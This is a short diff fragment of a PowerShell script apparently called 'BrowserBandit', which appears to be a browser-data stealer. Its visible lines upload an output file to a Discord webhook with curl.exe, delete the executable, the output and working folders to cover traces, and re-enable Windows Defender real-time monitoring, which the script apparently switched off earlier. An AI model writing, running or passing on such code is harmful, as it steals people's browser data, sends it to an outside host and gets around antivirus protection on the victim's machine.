@@ -23,8 +23,7 @@ curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@$outputFile" $disco
 # Clean up
 Remove-Item $exePath, $outputFile
 cd ..
-Remove-Item "C:/fileUp"
-Remove-Item "$env:temp\BrowserBandit.ps1"
+Remove-Item "C:/BrowserBandit"
 
 # Re-enable real-time monitoring and exit
 Set-MpPreference -DisableRealtimeMonitoring 0
